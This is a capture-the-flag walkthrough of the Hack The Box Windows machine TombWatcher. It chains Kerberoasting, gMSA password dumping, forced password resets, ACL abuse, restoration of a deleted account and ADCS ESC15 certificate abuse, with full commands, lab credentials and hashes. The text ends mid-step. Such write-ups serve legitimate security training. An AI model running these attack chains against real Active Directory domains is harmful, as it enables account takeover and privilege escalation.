---
icon: windows
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# TombWatcher Season 8 Machine Walk-through

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

_Welcome! This write-up walks through the_ **TombWatcher** se&#x61;_&#x73;on8 machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

### Machine Info <a href="#id-55ff" id="id-55ff"></a>

* **Machine Name:** TombWatcher
* **Machine OS: Windows**
* **Difficulty:** Medium
* Machine Link: \[[https://app.hackthebox.com/machines/TombWatcher](https://app.hackthebox.com/machines/TombWatcher)]

TombWatcher is a Medium level Windows machine from session 8.

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: `henry / H3nry_987TGV!`

> Note: In some of the next steps we may get a “Clock skew too great” error. Then run the following command to fix the probelm: `sudo ntpdate <target>`
>
> Becouse Kerberos is very sensitive to time synchronization. If the clock difference between your machine and the terget machine is more than 5 minutes, authentication fails. This is a security feature in Kerberos to prevent replay attacks.

### Initial Scanning: <a href="#id-508c" id="id-508c"></a>

```bash
nmap -p- -A -sC -vv --min-rate 10000 10.10.11.72 -oN scan.txt

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-11T13:32:00+00:00; +3h35m38s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/11%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6899BE46%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=U)
SEQ(SP=108%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h35m37s, deviation: 0s, median: 3h35m37s
| smb2-time: 
|   date: 2025-08-11T13:31:20
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20899/tcp): CLEAN (Timeout)
|   Check 2 (port 25671/tcp): CLEAN (Timeout)
|   Check 3 (port 61752/udp): CLEAN (Timeout)
|   Check 4 (port 51312/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   69.90 ms 10.10.14.1
2   69.95 ms 10.10.11.72
```

we found many open ports and also DC name and Domain name: `dc01.tombwatcher.htb and tombwatcher.htb`.

Now we try to collects Active directory data from tomwatcher.htb and generates a zipped. Bloodhound ingestion file using credentials for henry.

```bash
bloodhound-python -u 'henry' -p 'H3nry_987TGV!'  -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*VZNp1wxbf4ymvxMkn3kvNQ.png" alt="" height="215" width="700"><figcaption></figcaption></figure>

Looking into Bloodhound we should find a set of relationships, starting at our user “Henry” and finishing in the user “JOHN”, who is the first one with remote access privileges.\
The first relationship we need to exploit is the next one: the user Henry has “WriteSPN (Service Principal Name)” to the user Alfred.\
With this ability we can attempt to add a SPN and then do a kerberos auth to obtain a crackable hash, it’s called: Targeted Kerberoasting.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*xEfUhC08dFlNSmaOJkNbFA.png" alt="" height="280" width="700"><figcaption></figcaption></figure>

Targeted Kerberoasting Attack using `targetedKerberoast.py`

**Github link:** \[[https://github.com/ShutdownRepo/targetedKerberoast/tree/main](https://github.com/ShutdownRepo/targetedKerberoast/tree/main)]

```bash
python3 targetedKerberoast/targetedKerberoast.py -u henry -p 'H3nry_987TGV!' --dc-ip 10.10.11.72 -d tombwatcher.htb
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*tzZXzW-BptDSApqHexZDuQ.png" alt="" height="167" width="700"><figcaption></figcaption></figure>

Now try to crack the hash using john.

```bash
john alfred_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*ICPCmb955gzxFcqYzHqIcA.png" alt="" height="156" width="700"><figcaption></figcaption></figure>

And we successfully found the Alfred password `basketball`.

In bloodhound data we can see that the Alfred has “AddSelf” access to the group “INFRASTRUCTURE”. So now we try to add Alfred to the INFRASTRUCTURE group by using BloodyAD.

```bash
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' add groupMember INFRASTRUCTURE alfred    
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*TcYrBxCvJG5gZFLjCD-Mjg.png" alt="" height="45" width="700"><figcaption></figcaption></figure>

Then, we have the next relationship: the group INFRASTRUCTURE has “ReadGMSAPassword” to ANSIBLE\_DEV$ (Group managed service account).

The explanation of how this can be exploited is as follows (bloodhound):

> Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).\
> The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.

Now try to dum ANSIBLE\_DEV$ Password by using `gMSADumper.py`.

**Github link:** \[[https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)]

```bash
python3 gMSADumper/gMSADumper.py -u alfred -p basketball -d tombwatcher.htb 
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Nr3zSmfrOOc5Eg9RdfiooQ.png" alt="" height="123" width="700"><figcaption></figcaption></figure>

Now we successfully get hash of ansible\_dev$.

Now we can see the bloodhound data that the ansible\_dev$ has ForceChangePassword to the user SAM. So, now we try to change the SAM user password by using previous obtained ansible\_dev$ user and hash.

```bash
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'ansible_dev$' -p :7bc5a56af89da4d3c03bc048055350f2 set password "sam" "Passw0rd"
```

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*mgJSgqOFNPFEiTPoixFV7w.png" alt="" height="46" width="700"><figcaption></figcaption></figure>

Finally we successfully change the SAM user’s password. Next we now that SAM has WriteOwner to the user john. Now try to change the owner of the john user.

```bash
impacket-owneredit -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Passw0rd'

impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Passw0rd'
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*v3kCFgtA42vizbLcGEjggQ.png" alt="" height="140" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*sJeL-oKMxJfVG6BLJTrRhg.png" alt="" height="81" width="700"><figcaption></figcaption></figure>

Now we try to force change the password of john user.

```bash
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "sam" -p "Passw0rd" set password "john" "john@123" 
```

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*3ufDF8O4uOvxOQnOu08TUg.png" alt="" height="57" width="700"><figcaption></figcaption></figure>

Now try to get remote access of john user. And We successfully get remote access and also user flag🎉.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*OJZbJxOPkkuj-hrZBbYjLg.png" alt="" height="173" width="700"><figcaption></figcaption></figure>

Now, for privilege escalation, analysis bloodhound data and observe that JOHN has a GenericAll relationship over the ADCS Organizational Unit.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*gul7ZpihTh5Pt2j39mnncw.png" alt="" height="244" width="700"><figcaption></figcaption></figure>

Now we can use `certipy-ad` to find any vulnerability.

```bash
certipy-ad find -u 'john@tombwatcher.htb' -p 'john@123' -dc-ip 10.10.11.72 -stdout

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Enumeration output:
Certificate Authorities
   17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
```

If we look into the Permissions section, we would see `S-1-5-21-1392491010-1358638721-2126982587-1111`. This SID is not resolved to a human-readable name, which usually indicates that the original object (a user or group) has been deleted from Active Directory. This can suggest a potential misconfiguration or orphaned privilege still present on the template. If the SID belonged to a previously user with vulnerabilites, this could be leveraged for privilege escalation or abuse of certificate enrollment.

Now we can check the Active Directory Recycle Bin (on the host) for deleted users by using previously founded information.

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties *

CanonicalName                   : tombwatcher.htb/Deleted Objects                                                                                                      
CN                              : Deleted Objects                                                                                                                      
Created                         : 11/15/2024 7:01:41 PM                                                                                                                
createTimeStamp                 : 11/15/2024 7:01:41 PM                                                                                                                
Deleted                         : True                                                                                                                                 
Description                     : Default container for deleted objects                                                                                                
DisplayName                     :                                                                                                                                      
DistinguishedName               : CN=Deleted Objects,DC=tombwatcher,DC=htb                                                                                             
dSCorePropagationData           : {12/31/1600 7:00:00 PM}                                                                                                              
instanceType                    : 4                                                                                                                                    
isCriticalSystemObject          : True                                                                                                                                 
isDeleted                       : True                                                                                                                                 
LastKnownParent                 :                                                                                                                                      
Modified                        : 11/15/2024 7:56:00 PM                                                                                                                
modifyTimeStamp                 : 11/15/2024 7:56:00 PM                                                                                                                
Name                            : Deleted Objects                                                                                                                      
ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb                                                                        
ObjectClass                     : container                                                                                                                            
ObjectGUID                      : 34509cb3-2b23-417b-8b98-13f0bd953319                                                                                                 
ProtectedFromAccidentalDeletion :                                                                                                                                      
sDRightsEffective               : 0                                                                                                                                    
showInAdvancedViewOnly          : True                                                                                                                                 
systemFlags                     : -1946157056                                                                                                                          
uSNChanged                      : 12851                                                                                                                                
uSNCreated                      : 5659                                                                                                                                 
whenChanged                     : 11/15/2024 7:56:00 PM                                                                                                                
whenCreated                     : 11/15/2024 7:01:41 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
CN                              : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
codePage                        : 0
countryCode                     : 0
Created                         : 11/15/2024 7:55:59 PM
createTimeStamp                 : 11/15/2024 7:55:59 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/15/2024 7:57:59 PM
modifyTimeStamp                 : 11/15/2024 7:57:59 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133761921597856970
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 12975
uSNCreated                      : 12844
whenChanged                     : 11/15/2024 7:57:59 PM
whenCreated                     : 11/15/2024 7:55:59 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
CN                              : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:04:05 PM
createTimeStamp                 : 11/16/2024 12:04:05 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:04:21 PM
modifyTimeStamp                 : 11/16/2024 12:04:21 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762502455822446
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13171
uSNCreated                      : 13161
whenChanged                     : 11/16/2024 12:04:21 PM
whenCreated                     : 11/16/2024 12:04:05 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```

We should find a deleted user whose SID matches the one found in the certificate template permissions which is cert\_admin. Another key detail is that the cert\_admin user was originally located in the ADCS OU, over which we have control.

Now, we can restore the deleted user and reset their password for further exploitation:

```bash
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"

*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity "cert_admin" -Reset -NewPassword (ConvertTo-SecureString "Passw0rd" -AsPlainText -Force)
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*pum3L1HEJ1li-UBbKlMIQg.png" alt="" height="52" width="700"><figcaption></figcaption></figure>

Now we can rerun the `certipy-ad` to check if we now have access to a vulnerable certificate template.

```bash
certipy-ad find -vulnerable -u 'cert_admin@tombwatcher.htb' -p 'Passw0rd' -dc-ip 10.10.11.72 -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

This time, the WebServer template, which was not previously marked as vulnerable, is now identified as vulnerable. And we can found the [CVE-2024–49019](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)

According to the wiki, we need to follow Scenario B. If we mistakenly follow Scenario A, we’ll end up with a ldap\_shell, which is not useful in this case.

### Step-1 <a href="#dc79" id="dc79"></a>

Request a certificate using the vulnerable template with the Certificate Request Agent policy:

```bash
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Passw0rd' -dc-ip '10.10.11.72' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Lw-CaUzj-S9yLNOWnzJv7A.png" alt="" height="117" width="700"><figcaption></figcaption></figure>

### Step-2 <a href="#id-5c7d" id="id-5c7d"></a>

Use that certificate to request another one on behalf of the domain admin:

```bash
